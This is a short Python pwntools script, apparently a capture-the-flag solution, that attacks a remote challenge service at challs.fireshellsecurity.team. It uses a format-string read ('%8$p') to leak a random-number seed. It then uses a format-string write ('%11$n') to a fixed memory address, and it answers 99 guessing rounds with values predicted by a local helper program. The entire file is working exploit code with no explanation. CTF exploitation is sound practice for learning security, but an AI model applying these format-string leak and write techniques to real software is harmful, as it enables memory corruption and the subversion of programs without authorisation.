from pwn import *
import commands

host, port = "challs.fireshellsecurity.team", 31006

# Round 1
payload = "%8$p"
sock = remote(host, port)
sock.recvuntil("name? ")
sock.sendline(payload)
sock.recvuntil("Welcome ")
seed = int(sock.recvline().strip(), 16) + 3 # point!
print("[+] Seed = " + hex(seed))
sock.close()

# Round 2
payload = "AAA%11$n"
payload += p64(0x602020)
sock = remote(host, port)
#_ = raw_input()
sock.recvuntil("name? ")
sock.send(payload)

for cnt in range(1, 100):
    random = int(commands.getoutput("./a.out {0} {1}".format(seed, cnt)))
    print("[+] Round: {0}".format(cnt))
    sock.recvuntil("number: ")
    sock.sendline(str(random))
    if 'Sorry!' in sock.recvline():
        print("[-] Something is wrong......")
        exit(1)

print(sock.recv(4096))
print(sock.recv(4096))
